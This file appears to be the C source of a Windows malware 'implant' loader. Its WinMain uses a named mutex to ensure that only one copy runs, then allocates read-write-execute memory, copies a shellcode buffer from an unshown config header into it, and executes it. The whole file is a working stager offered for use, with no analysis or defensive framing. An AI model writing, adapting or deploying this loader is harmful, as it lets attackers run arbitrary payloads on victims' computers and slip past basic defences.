#include "implant.h"
#include "config.h"

int APIENTRY WinMain(_In_ HINSTANCE hInst,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPTSTR    lpCmdLine,
	_In_ int       nCmdShow) {
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	char *buffer;
	void(*shellcodefunction)();
	unsigned int size = sizeof(buf);

	if (MutexCheck(MUTEX_NAME)) {
		// No mutex exists, so run the code
		buffer = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		memcpy(buffer, buf, size);
		shellcodefunction = (void(*)()) buffer;
		shellcodefunction();
	}

	ExitProcess((UINT)NULL);
}


unsigned int MutexCheck(const char *name) {
	HANDLE mutex = NULL, error = NULL;

	mutex = CreateMutex(NULL, TRUE, name);
	if (mutex == NULL) {
		// Error creating the mutex. This could be because
		// we are trying to create a Global mutex and it exists
		// already.
		return FALSE;
	}
	else {
		// Handle has been returned
		error = (HANDLE)GetLastError();
		if (error == (HANDLE)ERROR_ALREADY_EXISTS) {
			// Mutex already exists
			return FALSE;
		}
		else {
			return TRUE;
		}
	}
}
